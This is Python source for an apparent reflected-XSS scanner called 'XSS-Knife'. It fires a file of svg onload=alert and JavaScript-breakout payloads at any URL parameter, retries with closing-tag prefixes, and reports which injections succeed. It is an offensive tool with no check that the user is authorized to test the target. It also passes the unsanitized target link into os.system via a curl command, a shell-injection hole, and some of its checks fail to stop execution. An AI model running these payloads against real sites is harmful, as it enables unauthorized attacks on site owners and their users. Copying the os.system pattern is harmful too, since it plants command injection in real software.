# Import custom libs, xss is the xss.py lib file, Xssrun and Payloads are the classes in xss.py
import numpy as np  # variables used: array,payload_verify,line
import requests  # variables used: request
import string  # None

# Importing time lib to do the time calculation
import time  # Variables used: total_start,start,end,total_end


class Xssrun:
    def __init__(self, link, payload, title_rerun, style_rerun, textarea_rerun, noscript_rerun, script_rerun,
                 user_agent):
        # Create a request on the victim site
        # Variable who defines if there is a successfully XSS
        found_xss = 0
        # Variable to identify if there is a <noscript> tag on code, 0 = no, 1 = yes
        noscript_tag = 0

        # Get the arguments passed through runxss.py
        self.link = link
        self.payload = payload
        self.title_rerun = title_rerun
        self.style_rerun = style_rerun
        self.textarea_rerun = textarea_rerun
        self.noscript_rerun = noscript_rerun
        self.script_rerun = script_rerun
        self.user_agent = user_agent

        # Convert the payload to string to ease manipulation
        payload = str(payload)
        user_agent = str(user_agent)
        if not user_agent == "none":
            headers = {
                'User-Agent': user_agent
            }
            request = requests.get(link + payload, headers=headers)
        else:
            # Initiate a request on the site that was send to class
            request = requests.get(link + payload)

        # Parse the data
        parseHTML = str(request.content)
        # Prepare the data to create a array
        parseHTML = parseHTML.split("\\n")
        # Create the array
        array = np.array(parseHTML)
        # Create a array with successfully xss to compare with the source code
        payload_verify = np.array(
            ["/\"><svg onload=alert(34305489723146875555666)>", "<svg onload=alert(34305489723146875555666)>",
             "</script><svg onload=alert(34305489723146875555666)>"])
        # Variable to help to count the array position
        arr_count = 0
        # Variable to identify if there is a <title> tag on code, 0 = no, 1 = yes
        title_tag = 0
        # Variable to identify if there is a <style> tag on code, 0 = no, 1 = yes
        style_tag = 0
        # Variable to identify if there is a <textarea> tag on code, 0 = no, 1 = yes
        textarea_tag = 0
        # Variable to identify if there is a <noscript> tag on code, 0 = no, 1 = yes
        noscript_tag = 0
        # Variable to identify if there is a <script> tag on code, 0 = no, 1 = yes
        script_tag = 0

        # Variable used to pass to runxss.py if there is a <title> tag on code, 0 = no, 1 = yes
        title_xss = 0
        # Variable used to pass to runxss.py if there is a <style> tag on code, 0 = no, 1 = yes
        style_xss = 0
        # Variable used to pass to runxss.py if there is a <textarea> tag on code, 0 = no, 1 = yes
        textarea_xss = 0
        # Variable used to pass to runxss.py if there is a <noscript> tag on code, 0 = no, 1 = yes
        noscript_xss = 0
        # Variable used to pass to runxss.py if there is a <script> tag on code, 0 = no, 1 = yes
        script_xss = 0

        # Variable used to mark if there is the payload in code
        self.found_xss = 0

        # Create a loop with the array values
        for x in array:
            # Transform to string, it will us"</script>ed for some tests
            self.x = str(x)
            find_payload = x.find(payload)
            # LOG.emit(x)
            ##Verify if the payload is between <title></title>, if so, the XSS will not get success
            ##############################################################################################
            if not x in string.whitespace:
                # Test and set to 1 if there is a <title> tag on reflection
                if "<title" in x:
                    title_tag = 1

                if "</title>" in x:
                    title_tag = 0

                if "34305489723146875555666" in x and title_tag == 1:
                    title_xss = 1
                # Test some special cases, if exists in reflection, means there is  XSS
                if "\\'&lt;/title>\\'-alert(34305489723146875555666)-\\'" in x:
                    found_xss = 1
                if "\\'\\'-alert(34305489723146875555666)-\\'" in x:
                    found_xss = 1
                if "\\'\\\\\\\\\\'-alert(34305489723146875555666)\/\/" in x:
                    found_xss = 1
                if "\\'&lt;/title>\\\\\\\\\\'-alert(34305489723146875555666)//" in x:
                    found_xss = 1
            ##Verify if the payload is between <style></style>, if so, the XSS will not get success
            ##############################################################################################
            if not x in string.whitespace:
                # Test and set to 1 if there is a <style> tag on reflection
                if "<style" in x:
                    style_tag = 1

                if "</style>" in x:
                    style_tag = 0

                if "34305489723146875555666" in x and style_tag == 1:
                    style_xss = 1
                # Test some special cases, if exists in reflection, means there is  XSS
                if "\\'&lt;/style>\\'-alert(34305489723146875555666)-\\'" in x:
                    found_xss = 1
                if "\\'\\'-alert(34305489723146875555666)-\\'" in x:
                    found_xss = 1
                if "\\'\\\\\\\\\\'-alert(34305489723146875555666)\/\/" in x:
                    found_xss = 1
                if "\\'&lt;/style>\\\\\\\\\\'-alert(34305489723146875555666)//" in x:
                    found_xss = 1
            ##Verify if the payload is between <textarea></textarea>, if so, the XSS will not get success
            ##############################################################################################
            if not x in string.whitespace:
                # Test and set to 1 if there is a <textarea> tag on reflection
                if "<textarea" in x:
                    textarea_tag = 1

                if "</textarea>" in x:
                    textarea_tag = 0

                if "34305489723146875555666" in x and textarea_tag == 1:
                    textarea_xss = 1
                # Test some special cases, if exists in reflection, means there is  XSS
                if "\\'&lt;/textarea>\\'-alert(34305489723146875555666)-\\'" in x:
                    found_xss = 1
                if "\\'\\'-alert(34305489723146875555666)-\\'" in x:
                    found_xss = 1
                if "\\'\\\\\\\\\\'-alert(34305489723146875555666)\/\/" in x:
                    found_xss = 1
                if "\\'&lt;/script>\\\\\\\\\\'-alert(34305489723146875555666)//" in x:
                    found_xss = 1
            ##Verify if the payload is between <noscript></noscript>, if so, the XSS will not get success
            ##############################################################################################
            if not x in string.whitespace:
                # Test and set to 1 if there is a <noscript> tag on reflection
                if "<noscript" in x:
                    noscript_tag = 1

                if "</noscript>" in x:
                    noscript_tag = 0

                if "34305489723146875555666" in x and noscript_tag == 1:
                    noscript_xss = 1
                # Test some special cases, if exists in reflection, means there is  XSS
                if "\\'&lt;/noscript>\\'-alert(34305489723146875555666)-\\'" in x:
                    found_xss = 1
                if "\\'\\'-alert(34305489723146875555666)-\\'" in x:
                    found_xss = 1
                if "\\'\\\\\\\\\\'-alert(34305489723146875555666)\/\/" in x:
                    found_xss = 1
                if "\\'&lt;/noscript>\\\\\\\\\\'-alert(34305489723146875555666)//" in x:
                    found_xss = 1
            # Verify if the payload is between <script></script>, if so, the XSS will not get success
            ##############################################################################################

            if not x in string.whitespace:
                # Test and set to 1 if there is a <script> tag on reflection
                if "<script" in x:
                    script_tag = 1

                if "</script>" in x:
                    script_tag = 0

                if "34305489723146875555666" in x and script_tag == 1:
                    script_xss = 1
                # Test some special cases, if exists in reflection, means there is  XSS
                if "\\'&lt;/script>\\'-alert(34305489723146875555666)-\\'" in x:
                    found_xss = 1
                if "\\'\\'-alert(34305489723146875555666)-\\'" in x:
                    found_xss = 1
                if "\\'\\\\\\\\\\'-alert(34305489723146875555666)\/\/" in x:
                    found_xss = 1
                if "\\'&lt;/script>\\\\\\\\\\'-alert(34305489723146875555666)//" in x:
                    found_xss = 1

                ##############################################################################################

                # Here test the opposite, if exists in reflection, means there is no XSS and suspend the current loop step
                if "&lt;svg onload=alert(34305489723146875555666)>" in x:
                    break
                if "&apos;-alert(34305489723146875555666)-&apos;" in x:
                    break
                if "-alert" in x:
                    break

                # Do some tests with the payload_verify array who contains a successfully XSS in reflection to test
                for a in payload_verify:
                    # Verifies if the code contained in the loop step coincides with array step and the <script> tag verification variable is set
                    if a in x and script_tag == 1 and "34305489723146875555666" in x:
                        # Verifies if the re-run variable is set, if set, set a script_xss variable to on to send to runxss.py confirmation there really is a <script> around reflection.
                        if script_rerun == 0:
                            script_xss = 1
                        # Verifies if this is a re-run with </script> in payload and if the code contained in the loop step coincides with array, if yes, there is a XSS
                        elif script_rerun == 1 and x in a:
                            found_xss = 1
                    # Verifies if the code contained in the loop step coincides with array and there is no <script> tag signal enabled.
                    elif a in x and script_tag == 0:
                        found_xss = 1

        # Define the parameters to return to runxss.py
        self.title_xss = title_xss
        self.style_xss = style_xss
        self.textarea_xss = textarea_xss
        self.noscript_xss = noscript_xss
        self.script_xss = script_xss
        self.found_xss = found_xss


# Define a class who open the payload file containing the test lines
class Payloads:
    def __init__(self):
        file = open('XSS_knife/payloads', 'r')
        Lines = file.readlines()
        self.line = np.array(Lines)
        file.close()


# Start counting
total_start = time.time()

# import termcolor lib
from termcolor import colored, cprint  # Variables used: none

# Import general libs

# re is a regular expression lib in python, used to compare and verify strings
import re  # Variables used: parameter_used
# Sys is system specific parameters and functions in python, used to run linux commands
import sys  # Variables used: arguments,link,user_agent
# Requests is a http request lib, used to do the xss requests
import requests  # Variables used: request

# Used to run linux commands
from os import system  # variables used: check_site


def xss(link, LOG):
    # Start the xss quantity variable
    xss_qtdy = 0
    LOG.emit("XSS started...")
    # Define the fancy ASCII art to print on screeen =)
    motd = """

    [+][+][+][+] An XSS vulnerability exploiter [+][+][+][+]

    """

    # Get the first argument

    user_agent = "none"

    # Print help info, if requested
    if "--help" in link or "-h" in link:
        LOG.emit("Usage example: ./XSS-knife.py http://website.com/xss.php?a=\n")
        LOG.emit(
            "Usage example with custom user agents: ./XSS-knife.py http://website.com/xss.php?a= --user-agent \"a custom user-agent\"\n")
        LOG.emit("--help or -h: Show how to use the tool!")
        LOG.emit("--version or -v: Show the version of XSS-Knife")
        LOG.emit("--user-agent: Set the user agent")

    # Print version of code
    if "--version" in link or "-v" in link:
        LOG.emit("XSS-Knife, version 1.0.0")

    # verifies if there is a url parameter to test, if not, halt the program.
    if not re.findall(r'\?\w*', link):
        LOG.emit("Please specify the url parameter you want to test! type --help for more info.")

    # Verifies if there is http: or https: on the request (its necessary)
    if not re.findall(r'http|https', link):
        LOG.emit("You need to specify the http protocol! type --help for more info.")

    # Verify if the site is reachable
    LOG.emit("Doing pre-check of " + link)

    # If user agent is defined, start the test request with the custom user agent!
    if not user_agent == "none":
        command = "curl -s -o /dev/null -H User-Agent:" + user_agent + " " + link
    else:
        command = "curl -s -o /dev/null " + link

    # Do the site test with the acquired link and see the result, if greater then 0 is bad.
    LOG.emit(command)
    check_site = system(command)
    if check_site > 0:
        LOG.emit("I cant reach to this site!!!")
    else:
        LOG.emit("Page is reachable! Doing next pre-check...")

    # If user agent is defined, do second check, if site returns something.
    if not user_agent == "none":
        headers = {
            'User-Agent': user_agent
        }
        request = requests.get(link, headers=headers)
    else:
        request = requests.get(link)

    # If request code acquired from the second check not 200, the page is not acessible
    if not (request.status_code) == 200:
        LOG.emit("Could not access the page!")
        LOG.emit("Http status code:", request.status_code)
    else:
        LOG.emit("Http status code 200, we're good to go!")
        LOG.emit("\n")

    # find what url parameter is used in XSS test
    parameter_finder = r"\?(?P<parameter>.*)\="
    parameter_used = re.search(parameter_finder, str(link))

    # Verify if the parameter syntax is correct, if not, end the code
    if parameter_used:
        LOG.emit("Parameter used: " + parameter_used.group('parameter'))
    else:
        LOG.emit("incorrect syntax, are you using the '=' after the parameter? see --help for more info.")

    # Call the payload class to get the payloads to compare
    payload = Payloads().line
    for i in payload:
        # Start counting time
        start = time.time()
        # Call the Xssrun class, sending the parameters
        xss = Xssrun(link, str(i), 0, 0, 0, 0, 0, user_agent)
        # End counting time, with this i can count how many time the xss run
        end = time.time()
        time_run = end - start

        # After get the Xssrun class values, compare if there is a <script>,<noscript>,<textarea>,<style>,<title> tag open on the code, if do, run a custom payload.
        if xss.script_xss == 1:
            # Rerun the XSS with </script>
            start = time.time()
            xss = Xssrun(link, "</script>" + str(i), 0, 0, 0, 0, 1, user_agent)
            end = time.time()
            time_run = end - start
            # After the new run with a custom payload, if found_xss is set to 1, there is a XSS
            if xss.found_xss == 1:
                xss_qtdy = xss_qtdy + 1
                LOG.emit("Found xss in payload " + link + "</script>" + str(i) + "Time elapsed for test: " + str(
                    time_run) + " seconds")

                # Print the type of xss (if found)
                if re.findall(r'^\/\"><svg onload=alert\(34305489723146875555666\)>', str(i)):
                    LOG.emit("XSS Type: Simple htmli")
                    LOG.emit("\n")
                if re.findall(r'^<svg onload=alert\(34305489723146875555666\)>', str(i)):
                    LOG.emit("XSS Type: inline htmli")
                    LOG.emit("\n")
                if re.findall(r'^\"><svg onload=alert\(34305489723146875555666\)>', str(i)):
                    LOG.emit("XSS Type: inblock htmli ")
                    LOG.emit("\n")
                if re.findall(r'\'-alert\(34305489723146875555666\)-\'', str(i)):
                    LOG.emit("XSS Type: js inblock htmli")
                    LOG.emit("\n")
                if re.findall(r'\\\'-alert\(34305489723146875555666\)//', str(i)):
                    LOG.emit("XSS Type: simple js injection")
                    LOG.emit("\n")
                continue
        if xss.noscript_xss == 1:
            # Rerun the XSS with </noscript>
            start = time.time()
            xss = Xssrun(link, "</noscript>" + str(i), 0, 0, 0, 1, 0, user_agent)
            end = time.time()
            time_run = end - start
            # After the new run with a custom payload, if found_xss is set to 1, there is a XSS
            if xss.found_xss == 1:
                xss_qtdy = xss_qtdy + 1
                LOG.emit("Found xss in payload " + link + "</noscript>" + str(i) + "Time elapsed for test: " + str(
                    time_run) + " seconds")

                # Print the type of xss (if found)
                if re.findall(r'^\/\"><svg onload=alert\(34305489723146875555666\)>', str(i)):
                    LOG.emit("XSS Type: Simple htmli")
                    LOG.emit("\n")
                if re.findall(r'^<svg onload=alert\(34305489723146875555666\)>', str(i)):
                    LOG.emit("XSS Type: inline htmli")
                    LOG.emit("\n")
                if re.findall(r'^\"><svg onload=alert\(34305489723146875555666\)>', str(i)):
                    LOG.emit("XSS Type: inblock htmli ")
                    LOG.emit("\n")
                if re.findall(r'\'-alert\(34305489723146875555666\)-\'', str(i)):
                    LOG.emit("XSS Type: js inblock htmli")
                    LOG.emit("\n")
                if re.findall(r'\\\'-alert\(34305489723146875555666\)//', str(i)):
                    LOG.emit("XSS Type: simple js injection")
                    LOG.emit("\n")
                continue
        if xss.textarea_xss == 1:
            # Rerun the XSS with </textarea>
            start = time.time()
            xss = Xssrun(link, "</textarea>" + str(i), 0, 0, 1, 0, 0, user_agent)
            end = time.time()
            time_run = end - start
            # After the new run with a custom payload, if found_xss is set to 1, there is a XSS
            if xss.found_xss == 1:
                xss_qtdy = xss_qtdy + 1
                LOG.emit("Found xss in payload " + link + "</textarea>" + str(i) + "Time elapsed for test: " + str(
                    time_run) + " seconds")

                # Print the type of xss (if found)
                if re.findall(r'^\/\"><svg onload=alert\(34305489723146875555666\)>', str(i)):
                    LOG.emit("XSS Type: Simple htmli")
                    LOG.emit("\n")
                if re.findall(r'^<svg onload=alert\(34305489723146875555666\)>', str(i)):
                    LOG.emit("XSS Type: inline htmli")
                    LOG.emit("\n")
                if re.findall(r'^\"><svg onload=alert\(34305489723146875555666\)>', str(i)):
                    LOG.emit("XSS Type: inblock htmli ")
                    LOG.emit("\n")
                if re.findall(r'\'-alert\(34305489723146875555666\)-\'', str(i)):
                    LOG.emit("XSS Type: js inblock htmli")
                    LOG.emit("\n")
                if re.findall(r'\\\'-alert\(34305489723146875555666\)//', str(i)):
                    LOG.emit("XSS Type: simple js injection")
                    LOG.emit("\n")
                continue
        if xss.style_xss == 1:
            # Rerun the XSS with </style>
            start = time.time()
            xss = Xssrun(link, "</style>" + str(i), 0, 1, 0, 0, 0, user_agent)
            end = time.time()
            time_run = end - start
            # After the new run with a custom payload, if found_xss is set to 1, there is a XSS
            if xss.found_xss == 1:
                xss_qtdy = xss_qtdy + 1
                LOG.emit("Found xss in payload " + link + "</style>" + str(i) + "Time elapsed for test: " + str(
                    time_run) + " seconds")

                # Print the type of xss (if found)
                if re.findall(r'^\/\"><svg onload=alert\(34305489723146875555666\)>', str(i)):
                    LOG.emit("XSS Type: Simple htmli")
                    LOG.emit("\n")
                if re.findall(r'^<svg onload=alert\(34305489723146875555666\)>', str(i)):
                    LOG.emit("XSS Type: inline htmli")
                    LOG.emit("\n")
                if re.findall(r'^\"><svg onload=alert\(34305489723146875555666\)>', str(i)):
                    LOG.emit("XSS Type: inblock htmli ")
                    LOG.emit("\n")
                if re.findall(r'\'-alert\(34305489723146875555666\)-\'', str(i)):
                    LOG.emit("XSS Type: js inblock htmli")
                    LOG.emit("\n")
                if re.findall(r'\\\'-alert\(34305489723146875555666\)//', str(i)):
                    LOG.emit("XSS Type: simple js injection")
                    LOG.emit("\n")
                continue
        if xss.title_xss == 1:
            # Rerun the XSS with </title>
            start = time.time()
            xss = Xssrun(link, "</title>" + str(i), 1, 0, 0, 0, 0, user_agent)
            end = time.time()
            time_run = end - start
            # After the new run with a custom payload, if found_xss is set to 1, there is a XSS
            if xss.found_xss == 1:
                xss_qtdy = xss_qtdy + 1
                LOG.emit("Found xss in payload " + link + "</title>" + str(i) + "Time elapsed for test: " + str(
                    time_run) + " seconds")

                # Print the type of xss (if found)
                if re.findall(r'^\/\"><svg onload=alert\(34305489723146875555666\)>', str(i)):
                    LOG.emit("XSS Type: Simple htmli")
                    LOG.emit("\n")
                if re.findall(r'^<svg onload=alert\(34305489723146875555666\)>', str(i)):
                    LOG.emit("XSS Type: inline htmli")
                    LOG.emit("\n")
                if re.findall(r'^\"><svg onload=alert\(34305489723146875555666\)>', str(i)):
                    LOG.emit("XSS Type: inblock htmli ")
                    LOG.emit("\n")
                if re.findall(r'\'-alert\(34305489723146875555666\)-\'', str(i)):
                    LOG.emit("XSS Type: js inblock htmli")
                    LOG.emit("\n")
                if re.findall(r'\\\'-alert\(34305489723146875555666\)//', str(i)):
                    LOG.emit("XSS Type: simple js injection")
                    LOG.emit("\n")
                continue

        # If just the  if found_xss is set to 1, if do, there is a XSS
        if xss.found_xss == 1:
            xss_qtdy = xss_qtdy + 1
            LOG.emit("Found xss in payload " + link + str(i) + "Time elapsed for test: " + str(time_run) + " seconds")

            # Print the type of xss (if found)
            if re.findall(r'^\/\"><svg onload=alert\(34305489723146875555666\)>', str(i)):
                LOG.emit("XSS Type: Simple htmli")
                LOG.emit("\n")
            if re.findall(r'^<svg onload=alert\(34305489723146875555666\)>', str(i)):
                LOG.emit("XSS Type: inline htmli")
                LOG.emit("\n")
            if re.findall(r'^\"><svg onload=alert\(34305489723146875555666\)>', str(i)):
                LOG.emit("XSS Type: inblock htmli")
                LOG.emit("\n")
            if re.findall(r'\'-alert\(34305489723146875555666\)-\'', str(i)):
                LOG.emit("XSS Type: js inblock htmli")
                LOG.emit("\n")
            if re.findall(r'\\\'-alert\(34305489723146875555666\)//', str(i)):
                LOG.emit("XSS Type: simple js injection")
                LOG.emit("\n")

    if xss_qtdy > 0:
        LOG.emit("Number of xss found: " + str(xss_qtdy))
    else:
        LOG.emit("No XSS found")

    total_end = time.time()
    total_time = total_end - total_start

    LOG.emit("Total time elapsed: " + str(total_time) + " seconds")

